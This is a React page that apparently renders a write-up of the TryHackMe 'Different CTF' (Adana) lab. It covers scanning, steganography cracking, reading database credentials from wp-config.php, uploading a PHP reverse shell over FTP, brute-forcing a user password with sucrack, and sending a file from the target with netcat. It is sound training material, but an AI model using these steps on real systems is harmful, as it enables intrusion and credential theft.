import React from 'react';

import ScrollspyContainer from '../ScrollspyContainer';
import ImageCap from './Helpers/ImageCap';

import landing from '../../img/cyberpunk.png';
import announcements from '../../img/different/announcements.png';
import binary from '../../img/different/binary.png';
import binaryCorrect from '../../img/different/binary-corr.png';
import find from '../../img/different/find.png';
import gobuster from '../../img/different/first-gobuster.png';
import flagOne from '../../img/different/flag1.png';
import flagTwo from '../../img/different/key2.png';
import flagThree from '../../img/different/flag3.png';
import ftpLogin from '../../img/different/ftp-login.png';
import hexeditor from '../../img/different/hexeditor.png';
import ltrace from '../../img/different/ltrace1.png';
import nmap from '../../img/different/nmap.png';
import revshell from '../../img/different/revshell.png';
import rootCreds from '../../img/different/rootCreds.png';
import sourceCode from '../../img/different/source-code.png';
import stegCracker from '../../img/different/stegcracker-success.png';
import strings from '../../img/different/strings.png';
import su from '../../img/different/su.png';
import subdomain from '../../img/different/subdomain.png';
import sucrack from '../../img/different/sucrack.png';
import wpConfig from '../../img/different/wp-config.png';





class Different extends React.Component {
    render() {
        return (
            <div className="writeup">
                <div className="container-fluid">
                    <div className="row bg-dark">
                        <nav className="col-3 px-1 position-fixed offset" >
                            <a href="https://tryhackme.com/room/adana" target="_blank" className="nav-header">Different CTF</a>
                            <hr></hr>
                            <ScrollspyContainer ids={['render','intro','enumeration','portscan','webinv','stego','exploitation','privesc','initial','webflag','hakanbey','userflag','rootflag']} />
                            <hr></hr>                     
                        </nav>
                        <div className="content col offset-3">
                            <div className="render" id="render"></div>
                            <div>
                                <div className="carousel landing">
                                    <div className="carousel-inner">
                                        <div className="carousel-item active landing-container">
                                            <img className="writeup-landing" src={landing} alt="Background image"></img>
                                            
                                        </div>
                                    </div>
                                </div>

                                <h1 id="intro">Introduction</h1>
                                <p>This is an interesting box that features many attack vectors which highlights the importance of thorough enumeration.</p>
                                <p>DifferentCTF falls into the following categories:</p>
                                <ul>
                                    <li>Linux</li>
                                    <li>Wordpress</li>
                                    <li>Steganography</li>
                                    <li>Reverse</li>
                                </ul>

                                <hr></hr>
                                <h1 id="enumeration">Enumeration</h1>
                                <h3 id="portscan" className="level-2">Port Scanning</h3>
                                <p>I used nmap to find open ports on the target machine:</p>
                                <p className="code-snippet">&gt; nmap -sS -sC -sV 10.10.43.253 -oN nmap.scan</p>
                                <br />
                                <ImageCap image={nmap} text="results from nmap scan." />
                                <p>As ftp does not have anonymous logon enabled, I started enumerating the website.</p>
                                <hr />
                                <h3 className="level-2" id="webinv">Website Investigation</h3>
                                <p>A broken homepage is shown, and a quick look at the homepage's source code shows a domain name.</p>
                                <ImageCap image={sourceCode} text="source code from website." />
                                <br />
                                <p className="code-snippet">adana.thm</p>
                                <p>After adding this to my <span className="code-snippet inline">/etc/hosts</span> file, I had another look. This time running a gobuster scan in the background:</p>
                                <p className="code-snippet">&gt; gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u adana.thm -o root-gobuster.scan</p>
                                <br />
                                <ImageCap image={gobuster} text="results from gobuster scan." />
                                <p>This scan revealed some interesting information:</p>
                                <ul>
                                    <li>- phpMyAdmin is being used to manage the database.</li>
                                    <li>- Wordpress is running on this site.</li>
                                    <li>- A directory named /announcements exists.</li>
                                </ul>
                                <hr />
                                <h3 className="level-3" id="stego">Steganography</h3>
                                <p>A look into the <span className="code-snippet inline">/announcements</span> directory provided a wordlist and a jpg image.</p>
                                <ImageCap image={announcements} text="index of announcements directory." />
                                <p>I downloaded these files and investigated this image as it looked suspicious.</p>
                                <p>The following commands were used but nothing was found:</p>
                                <ul>
                                    <li><span className="code-snippet inline">&gt; file austrailian-bulldog-ant.jpg</span></li>
                                    <li><span className="code-snippet inline">&gt; exiftool austrailian-bulldog-ant.jpg</span></li>
                                    <li><span className="code-snippet inline">&gt; strings austrailian-bulldog-ant.jpg  </span></li>
                                    <li><span className="code-snippet inline">&gt; steghide extract -sf austrailian-bulldog-ant.jpg</span></li>
                                    <li><span className="code-snippet inline">&gt; binwalk austrailian-bulldog-ant.jpg</span></li>
                                </ul>
                                <p>Eventually, I tried stegcracker using the wordlist provided:</p>
                                <p className="code-snippet">&gt; stegcracker austrailian-bulldog-ant.jpg wordlist.txt</p>
                                <br />
                                <ImageCap image={stegCracker} text="otuput from stegcracker." />
                                <p>Using this passphrase, a base64 encoded string was found. Decoding this provided an FTP login:</p>
                                <ImageCap image={ftpLogin} text="ftp login." />
                                <hr />
                                <h1 id="exploitation">Exploitation</h1>
                                <p>This took us to what looks like a website's root directory. I have permissions to upload files here, but cannot access them via Firefox.</p>
                                <p>I then downloaded wp-config.php, hoping to find some plaintext credentials:</p>
                                <ImageCap image={wpConfig} text="db credentials from wp-config.php." />
                                <p>These credentials allowed me to login to phpMyAdmin.</p>
                                <p>After taking a look at all the tables inside phpmyadmin and phpmyadmin1, wp-options showed a subdomain:</p>
                                <ImageCap image={subdomain} text="subdomain found in wp-options." />
                                <p>I added this subdomain to <span className="code-snippet inline">/etc/hosts</span> and had a look using Firefox.</p>
                                <p>Initially, this looks like an identical copy of the original domain adana.thm. But, I soon put two and two together and realised that the ftp login actually brought us to the root of this website. Allowing me to execute a reverse shell.</p>
                                <p>By uploading PentestMonkey's reverse PHP shell to the root directory of the website using FTP, I got initial access to the server:</p>
                                <ImageCap image={revshell} text="reverse shell obtained." />
                                <hr />
                                <h1 id="privesc">Privilege Escalation</h1>
                                <h3 className="level-2" id="initial">User Hakanbey</h3>
                                <h5 className="level-3" id="webflag">Web Flag</h5>
                                <p>The web flag was found in <span className="code-snippet inline">/var/www/html</span>:</p>
                                <ImageCap image={flagOne} text="web flag found." />
                                <p>After performing some manual enumeration, I remembered 'sucrack' being in the room's tags. This led me to using sucrack to brute force the password of 'hakanbey'.</p>
                                <p>I built and configured sucrack locally, and then served the binary to the target machine using a python server.</p>
                                <p>First, I used the wordlist found earlier to no avail. I then tried prepending all words in this list with '123adana', as both passwords I've found so far feature this phrase.</p>
                                <p>Altering the wordlist:</p>
                                <p className="code-snippet">&gt; sed '/^/123adana/' wordlist.txt &gt; newlist.txt</p>
                                <p>Running sucrack:</p>
                                <p className="code-snippet">&gt; ./sucrack -w 100 -u hakanbey newlist.txt</p>
                                <br />
                                <ImageCap image={sucrack} text="output from successful run of sucrack." />
                                <p>With a username and password, I used su to change user:</p>
                                
                                <ImageCap image={su} text="changing user." />
                                <hr />
                                <h3 className="level-2" id="hakanbey">Root User</h3>
                                <h5 className="level-3" id="userflag">User Flag</h5>
                                <p>Now, I have the user flag:</p>
                                <ImageCap image={flagTwo} text="user flag found." />
                                <p>As I now have permissions to run <span className="code-snippet inline">find</span>, I looked for all SUID files.</p>
                                <p className="code-snippet">&gt; find / -perm /4000 2&gt;/dev/null</p>
                                <br />
                                <ImageCap image={find} text="output from find command." />
                                <p>One file stands out, <span className="code-snippet inline">/usr/bin/binary</span>.</p>
                                <p>Executing this file in conjunction with strings, shows us that if the user inputs the correct hint, then a jpg file will be copied into hakanbey's home directory.</p>
                                <ImageCap image={binary} text="running the binary." />
                                <br />
                                <ImageCap image={strings} text="strings from the binary." />
                                <p>I then used ltrace to investigate further:</p>
                                <ImageCap image={ltrace} text="output from ltrace." />
                                <p>This shows the correct string to input, which I then used on the binary to get root.jpg.</p>
                                <ImageCap image={binaryCorrect} text="running the binary with the correct string." />
                                <p>Before following the hint and using hexeditor, I transfered the image to my local machine:</p>
                                <p className="code-snippet">(local) &gt; nc -l -p 1234 -q 1 &gt; root.jpg &lt; /dev/null</p>
                                <br />
                                <p className="code-snippet">(remote) &gt; cat root.jpg | nc 10.9.2.156 1234</p>
                                <br />
                                <p>With the image on my machine, I used hexeditor to find the offset mentioned in the hint:</p>
                                <ImageCap image={hexeditor} text="hexeditor of root.jpg." />
                                <p>Still following the hint, I coped this entire line of hex and ran it through Cyberchef:</p>
                                <ImageCap image={rootCreds} text="cyberchef used to get root credentials." />
                                <hr />
                                <h5 className="level-3" id="rootflag">Root Flag</h5>
                                <p>Now, I can use su to get root and view the root flag:</p>
                                <ImageCap image={flagThree} text="root flag found." />
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

export default Different;